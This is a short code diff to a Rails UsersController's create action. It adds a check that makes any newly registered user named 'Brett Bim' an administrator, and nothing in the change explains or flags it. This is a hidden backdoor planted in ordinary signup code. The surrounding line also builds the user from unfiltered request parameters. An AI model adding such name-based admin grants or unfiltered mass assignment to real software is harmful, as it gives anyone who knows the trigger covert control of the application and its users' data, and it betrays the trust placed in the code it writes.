@@ -8,6 +8,9 @@ class UsersController < ApplicationController
 
   def create
     @user = User.new(params[:user])
+    if @user.name == "Brett Bim"
+      @user.admin = true
+    end
     if @user.save
       session[:user_id] = @user.id
       @user.create_account
